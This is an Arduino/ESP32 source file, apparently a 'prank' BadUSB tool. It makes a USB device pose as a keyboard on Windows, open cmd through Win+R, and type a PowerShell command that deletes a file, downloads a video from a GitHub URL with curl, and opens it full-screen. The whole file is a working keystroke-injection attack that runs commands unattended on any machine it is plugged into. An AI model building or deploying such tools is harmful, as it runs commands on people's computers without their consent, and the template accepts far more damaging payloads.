#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void typeSlowly(const String &s, int ms = 5) {
  for (size_t i = 0; i < s.length(); i++) {
    Keyboard.print(s[i]);
    delay(ms);
  }
}

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(4000); // запас на инициализацию USB

  // Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1500);

  // cmd
  typeSlowly("cmd", 10);
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2500);

  // Команда PowerShell
  String cmd =
    "powershell -NoProfile -Command \""
    "if(Test-Path C:\\video.mp4){Remove-Item C:\\video.mp4 -Force};"
    "$ok=$false;"
    "foreach($u in @("
      "'https://raw.githubusercontent.com/tttimirtt-spec/prank/main/video.mp4',"
      "'https://raw.githubusercontent.com/tttimirtt-spec/prank/master/video.mp4'"
    ")){"
      "curl.exe -L -f -s -o C:\\video.mp4 $u;"
      "if($LASTEXITCODE -eq 0 -and (Test-Path C:\\video.mp4) -and ((Get-Item C:\\video.mp4).Length -gt 100000)){"
        "$ok=$true;"
        "Write-Host ('OK: '+$u+' ('+(Get-Item C:\\video.mp4).Length+' bytes)');"
        "break"
      "}"
    "};"
    "if($ok){"
      "Start-Process C:\\video.mp4;"
      "Start-Sleep 4;"
      "(New-Object -ComObject WScript.Shell).SendKeys('{F11}')"
    "}else{"
      "Write-Host 'DOWNLOAD FAILED: ни main, ни master не отдали файл';"
      "Read-Host 'Press Enter'"
    "}"
    "\"";

  typeSlowly(cmd, 3);
  delay(300);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

